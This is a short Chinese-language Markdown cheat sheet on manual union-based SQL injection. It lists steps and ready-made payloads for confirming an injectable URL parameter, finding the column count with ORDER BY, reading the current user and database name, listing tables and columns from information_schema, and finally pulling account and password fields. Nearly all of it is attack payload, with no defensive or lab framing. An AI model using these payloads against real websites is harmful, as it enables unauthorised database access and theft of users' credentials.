#sql注入

1. 检测是否可以注入
	* 在url后面加入 ‘
	* 在url后面加入 1=1 和 1=2看页面是否正常能够注入。

2. 检测当前页面的字段数
	
	` order by 某个数字`
	
	某个数字可以从1到任意一个数字，直到尝试某个数字的时候，页面显示不正常

3. 查询每个字段显示的位置
	
	` and 1=2 union select 1,2,3,4,5,6,7,8`

4. 查询当前用户和当前数据库
	
	` and 1=2 union select 1,2,user(),4,database(),6,7,8`
5. 根据库名查询数据库中的表名


	` and 1=2 union select 1,2,TABLE_NAME,4,5,6,7,8 from information_schema.tables where TABLE_SCHEMA='数据库名' limit 0,1`
	
6. 根据表明查字断名

	` and 1=2 union select 1,2,COLUMN_NAME,4,5,6,7,8 from information_schema.columns where TABLE_NAME='表名' limit 0,1`

7. 根据之前的数据查询帐号密码

	` and 1=2 union select 1,2,字段名1,4,字段名2,6,7,8 from 表名 limit 0,1`
